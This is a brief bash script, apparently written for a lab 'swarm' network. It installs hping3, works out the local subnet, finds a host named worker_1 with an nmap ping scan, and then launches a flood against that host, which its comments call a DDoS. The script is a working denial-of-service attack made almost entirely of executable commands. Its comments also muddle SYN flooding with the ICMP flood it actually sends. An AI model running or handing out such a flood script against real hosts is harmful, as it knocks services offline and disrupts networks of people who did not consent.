#update and upgrade the master node 
# so we can install hping3
sudo apt update
sudo apt upgrade -y
sudo apt install hping3 -y
#extracting the network information with ifconfig and inet commands
#and make it usable for the nmap command (etc. 192.168.1.*)
network=$(ifconfig | grep inet |  sed -n 1p | awk "{print \$2}" | cut -f 1-3 -d "."  | sed 's/$/.*/')    
clear
echo "Swarm network is " $network
# scanning network with nmap and extracting worker_1 IP 
worker1IP=$(nmap -sP $network | grep worker_1 | awk '{print $NF}' | tr -d '()')
# Ddos attack to worker_1 with syn flood at port 80 and icmp protocol
echo "Starting DDos attack to worker 1 with the IP address: " $worker1IP
sudo hping3 -p 80 --flood --icmp $worker1IP  